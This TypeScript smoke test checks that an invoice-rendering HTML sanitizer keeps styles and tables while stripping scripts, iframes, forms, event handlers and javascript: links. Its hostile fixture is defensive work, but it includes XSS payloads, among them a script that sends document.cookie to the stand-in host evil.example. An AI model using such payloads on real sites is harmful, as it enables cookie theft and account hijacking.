/**
 * smoke-sanitize.ts — assert what the /rendered sanitizer must and must
 * not let through.
 *
 * #243 allowed `<style>` through so a saved portal invoice keeps its
 * design. That widens the profile, so the properties it is responsible
 * for are worth stating as executable claims rather than prose:
 *
 *   1. stylesheets survive (the point of the change)
 *   2. script / iframe / form / link / event handlers do not
 *   3. a `</style>` inside a style block cannot smuggle markup past it
 *
 * The frontend renders this output in a `sandbox=""` iframe and the
 * route serves it under a strict CSP; this pass is the third layer.
 *
 * Usage: npx tsx scripts/smoke-sanitize.ts [path/to/real-document.html]
 */
import { readFileSync } from "node:fs";
import sanitizeHtml from "sanitize-html";
import { EMAIL_SANITIZE } from "../src/routes/documents.service.js";

let failures = 0;
function check(name: string, ok: boolean, detail = ""): void {
  console.log(`${ok ? "  ok  " : "  FAIL"} ${name}${detail ? " — " + detail : ""}`);
  if (!ok) failures++;
}

const HOSTILE = `
<html><head>
  <style>.paid { color: green } @import url(https://evil.example/x.css);</style>
  <link rel="stylesheet" href="https://evil.example/x.css">
  <script>fetch('https://evil.example/?c='+document.cookie)</script>
</head><body onload="alert(1)">
  <table><tr><td class="paid" style="font-weight:bold">Total $10.00</td></tr></table>
  <img src="https://tracker.example/px.gif" onerror="alert(2)">
  <iframe src="https://evil.example/"></iframe>
  <form action="https://evil.example/"><input name="card"><button>Pay</button></form>
  <a href="javascript:alert(3)">click</a>
  <style>body{}</style><script>alert(4)</script><style>.x{}</style>
</body></html>`;

const out = sanitizeHtml(HOSTILE, EMAIL_SANITIZE);

console.log("hostile fixture:");
check("keeps <style> blocks", (out.match(/<style/gi) ?? []).length >= 2);
check("keeps the CSS rule text", out.includes(".paid"));
check("keeps table markup", out.includes("<table") && out.includes("Total $10.00"));
check("keeps class hooks", out.includes('class="paid"'));
check("keeps inline style", out.includes("font-weight:bold"));
check("keeps remote img (product decision)", out.includes("tracker.example"));
check("drops <script> tags", !/<script/i.test(out));
check("drops script BODY, not just the tag", !out.includes("document.cookie") && !out.includes("alert(4)"));
check("drops <link>", !/<link/i.test(out));
check("drops <iframe>", !/<iframe/i.test(out));
check("drops <form> and <input>", !/<form/i.test(out) && !/<input/i.test(out));
check("drops event handlers", !/onload=/i.test(out) && !/onerror=/i.test(out));
check("drops javascript: hrefs", !/javascript:/i.test(out));
// @import survives the sanitizer by design — the route's CSP
// (style-src 'unsafe-inline', no remote origin) is what blocks it.
check("@import is left to the CSP", out.includes("@import"));

// A `</style>` inside a style block ends the element at the parser
// level; whatever follows is parsed as ordinary markup and must still
// face the allowlist.
const SMUGGLE = `<style>.a{}</style><script>alert(5)</script><style>.b{}</style>`;
const s2 = sanitizeHtml(SMUGGLE, EMAIL_SANITIZE);
console.log("\n</style> smuggling:");
check("no script survives the break-out", !/<script/i.test(s2) && !s2.includes("alert(5)"));
check("both style blocks survive", (s2.match(/<style/gi) ?? []).length === 2);

const real = process.argv[2];
if (real) {
  const src = readFileSync(real, "utf8");
  const r = sanitizeHtml(src, EMAIL_SANITIZE);
  const n = (s: string, re: RegExp) => (s.match(re) ?? []).length;
  console.log(`\nreal document ${real}:`);
  console.log(`  bytes   ${src.length} -> ${r.length}`);
  console.log(`  <style> ${n(src, /<style/gi)} -> ${n(r, /<style/gi)}`);
  console.log(`  class=  ${n(src, /class=/gi)} -> ${n(r, /class=/gi)}`);
  console.log(`  <table> ${n(src, /<table/gi)} -> ${n(r, /<table/gi)}`);
  console.log(`  <iframe> ${n(src, /<iframe/gi)} -> ${n(r, /<iframe/gi)}`);
  // NOT "every stylesheet survives". A SingleFile capture inlines the
  // page's frames as whole nested documents, each with its own <style>;
  // `iframe` is not an allowed tag, so a nested frame is dropped and its
  // stylesheet correctly goes with it — it styles content that is not
  // being rendered. The Tekmetric invoice has 6 style blocks and 5
  // iframes, and 5 blocks survive: the one that belongs to a frame is
  // the one that leaves.
  check("real document keeps most stylesheets", n(r, /<style/gi) >= n(src, /<style/gi) - n(src, /<iframe/gi));
  check("real document keeps at least one stylesheet", n(r, /<style/gi) > 0);
  check("real document keeps every table", n(r, /<table/gi) === n(src, /<table/gi));
  check("real document drops scripts", !/<script/i.test(r));
  check("real document drops frames", !/<iframe/i.test(r));
}

console.log(failures === 0 ? "\nsmoke-sanitize: all checks passed" : `\nsmoke-sanitize: ${failures} FAILED`);
process.exit(failures === 0 ? 0 : 1);
